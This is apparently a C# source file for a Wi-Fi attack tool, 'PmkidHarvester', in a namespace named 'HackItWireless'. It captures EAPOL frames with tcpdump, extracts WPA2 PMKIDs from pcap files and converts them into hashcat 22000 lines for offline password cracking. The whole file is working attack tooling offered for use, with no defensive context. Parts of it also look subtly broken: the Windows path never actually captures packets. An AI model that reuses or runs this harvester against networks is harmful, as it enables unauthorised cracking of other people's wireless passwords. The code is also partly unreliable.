using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace HackItWireless
{
    public sealed class PmkidHarvester
    {
        public List<string> ExtractPmkidsFromPcap(string pcapFile)
        {
            if (string.IsNullOrWhiteSpace(pcapFile))
                throw new ArgumentException("PCAP file path cannot be null or empty.", nameof(pcapFile));
            if (!File.Exists(pcapFile))
                throw new FileNotFoundException($"PCAP file not found: {pcapFile}", pcapFile);

            var results = new List<string>();
            byte[] fileBytes = File.ReadAllBytes(pcapFile);

            if (fileBytes.Length < 24)
                return results;

            uint magic = BinaryPrimitives.ReadUInt32LittleEndian(fileBytes.AsSpan(0, 4));
            bool isSwapped = magic switch
            {
                0xA1B2C3D4 => false,
                0xD4C3B2A1 => true,
                _ => throw new InvalidDataException($"Invalid PCAP magic: 0x{magic:X8}"),
            };

            int offset = 24;
            var eapolFrames = new List<(string SrcMac, string DstMac, byte[] Data)>();

            while (offset + 16 <= fileBytes.Length)
            {
                int inclLen = isSwapped
                    ? BinaryPrimitives.ReadInt32BigEndian(fileBytes.AsSpan(offset + 8, 4))
                    : BinaryPrimitives.ReadInt32LittleEndian(fileBytes.AsSpan(offset + 8, 4));

                offset += 16;

                if (inclLen <= 0 || offset + inclLen > fileBytes.Length)
                    break;

                byte[] packetData = new byte[inclLen];
                Array.Copy(fileBytes, offset, packetData, 0, inclLen);

                if (packetData.Length >= 14)
                {
                    ushort ethType = BinaryPrimitives.ReadUInt16BigEndian(packetData.AsSpan(12, 2));
                    if (ethType == 0x888E)
                    {
                        string srcMac = FormatMac(packetData, 6);
                        string dstMac = FormatMac(packetData, 0);
                        eapolFrames.Add((srcMac, dstMac, packetData));
                    }
                }

                offset += inclLen;
            }

            foreach (var frame in eapolFrames)
            {
                int eapolOff = 14;
                if (frame.Data.Length < eapolOff + 103)
                    continue;

                ushort keyDataLen = BinaryPrimitives.ReadUInt16BigEndian(
                    frame.Data.AsSpan(eapolOff + 101, 2));

                if (keyDataLen < 20)
                    continue;

                int kdOffset = eapolOff + 103;
                int pos = kdOffset;

                while (pos + 2 <= kdOffset + keyDataLen)
                {
                    byte elemId = frame.Data[pos];
                    byte elemLen = frame.Data[pos + 1];

                    if (pos + 2 + elemLen > kdOffset + keyDataLen)
                        break;

                    if (elemId == 0xDD && elemLen >= 22)
                    {
                        byte[] oui = frame.Data.AsSpan(pos + 2, 3).ToArray();
                        if (oui[0] == 0x00 && oui[1] == 0x0F && oui[2] == 0xAC)
                        {
                            byte type = frame.Data[pos + 5];
                            if (type == 0x04)
                            {
                                string pmkid = Convert.ToHexString(
                                    frame.Data, pos + 6, 16).ToLowerInvariant();
                                results.Add($"PMKID:{pmkid}|AP:{frame.DstMac}|STA:{frame.SrcMac}");
                            }
                        }
                    }

                    pos += 2 + elemLen;
                }
            }

            return results;
        }

        public string ConvertToHc22000(string pmkidHex, string apMac, string clientMac, string essid)
        {
            if (string.IsNullOrWhiteSpace(pmkidHex))
                throw new ArgumentException("PMKID hex cannot be null or empty.", nameof(pmkidHex));
            if (string.IsNullOrWhiteSpace(apMac))
                throw new ArgumentException("AP MAC cannot be null or empty.", nameof(apMac));
            if (string.IsNullOrWhiteSpace(clientMac))
                throw new ArgumentException("Client MAC cannot be null or empty.", nameof(clientMac));
            if (string.IsNullOrWhiteSpace(essid))
                throw new ArgumentException("ESSID cannot be null or empty.", nameof(essid));

            string apClean = apMac.Replace(":", "").Replace("-", "").ToUpperInvariant();
            string clClean = clientMac.Replace(":", "").Replace("-", "").ToUpperInvariant();
            string pmkidClean = pmkidHex.Replace(":", "").Replace("-", "").ToLowerInvariant();
            string essidHex = Convert.ToHexString(Encoding.UTF8.GetBytes(essid)).ToLowerInvariant();

            return $"WPA*01*{pmkidClean}*{essidHex}*{apClean}*{clClean}*";
        }

        public bool ValidateHc22000Line(string line)
        {
            if (string.IsNullOrWhiteSpace(line))
                return false;

            string trimmed = line.Trim();
            if (!trimmed.StartsWith("WPA*01*", StringComparison.Ordinal) &&
                !trimmed.StartsWith("WPA*02*", StringComparison.Ordinal))
                return false;

            string[] parts = trimmed.Split('*');
            if (parts.Length < 5)
                return false;

            if (parts[0] != "WPA")
                return false;

            if (parts[1] != "01" && parts[1] != "02")
                return false;

            if (!Regex.IsMatch(parts[2], @"^[0-9a-fA-F]{32,}$"))
                return false;

            if (!Regex.IsMatch(parts[3], @"^[0-9a-fA-F]+$"))
                return false;

            if (!Regex.IsMatch(parts[4], @"^[0-9a-fA-F]{12}$"))
                return false;

            return true;
        }

        public async Task HarvestLive(string interfaceName, int durationSec)
        {
            if (string.IsNullOrWhiteSpace(interfaceName))
                throw new ArgumentException("Interface name cannot be null or empty.", nameof(interfaceName));
            if (durationSec <= 0)
                throw new ArgumentException("Duration must be positive.", nameof(durationSec));

            string tempPcap = Path.Combine(Path.GetTempPath(), $"pmkid_{Guid.NewGuid():N}.pcap");

            try
            {
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = "netsh",
                        Arguments = $"wlan set network mode=bssid interface=\"{interfaceName}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                    };
                    using var proc = Process.Start(psi);
                    if (proc != null) await proc.WaitForExitAsync().ConfigureAwait(false);
                }
                else if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
                {
                    var psi = new ProcessStartInfo
                    {
                        FileName = "timeout",
                        Arguments = $"{durationSec} tcpdump -i \"{interfaceName}\" -w \"{tempPcap}\" " +
                                    "\"ether proto 0x888e\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                    };
                    using var proc = Process.Start(psi);
                    if (proc != null) await proc.WaitForExitAsync().ConfigureAwait(false);
                }
                else
                {
                    throw new PlatformNotSupportedException(
                        "Live PMKID harvesting is only supported on Windows and Linux.");
                }

                var pmkids = ExtractPmkidsFromPcap(tempPcap);
                foreach (var entry in pmkids)
                {
                    Trace.WriteLine(entry);
                }
            }
            finally
            {
                if (File.Exists(tempPcap))
                {
                    try { File.Delete(tempPcap); } catch { }
                }
            }
        }

        private static string FormatMac(byte[] data, int offset)
        {
            if (offset + 6 > data.Length)
                return "??";
            return string.Join(":", data.Skip(offset).Take(6).Select(b => b.ToString("X2")));
        }
    }
}
